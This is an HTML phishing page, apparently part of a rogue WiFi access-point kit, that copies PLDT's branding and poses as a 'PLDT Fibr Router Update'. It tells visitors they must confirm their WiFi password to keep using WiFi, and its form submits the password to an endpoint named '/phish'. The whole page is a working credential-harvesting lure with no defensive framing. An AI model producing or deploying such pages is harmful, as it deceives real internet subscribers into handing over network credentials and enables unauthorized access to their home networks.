<!DOCTYPE html>
<html>
<head>
    <title>PLDT Smart Login</title>
    <link rel="icon" href="/static/logos/pldt.png">
    <style>
        body { font-family: Arial; background: #fff3f3; text-align: center; padding-top: 80px; }
        img { width: 90px; }
        h2 { color: #b30000; }
        input { padding: 10px; width: 240px; margin-top: 20px; }
        button { background: #b30000; color: white; padding: 10px 25px; border: none; margin-top: 10px; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 2px 10px rgba(0,0,0,0.1); display: inline-block; }
    </style>
</head>
<body>
    <div class="card">
        <img src="/static/logos/pldt.png" alt="PLDT">
        <h2>PLDT Fibr Router Update</h2>
        <p>To continue using your WiFi, please confirm your password.</p>
        <form method="POST" action="/phish">
            <input type="password" name="password" placeholder="WiFi Password" required><br>
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
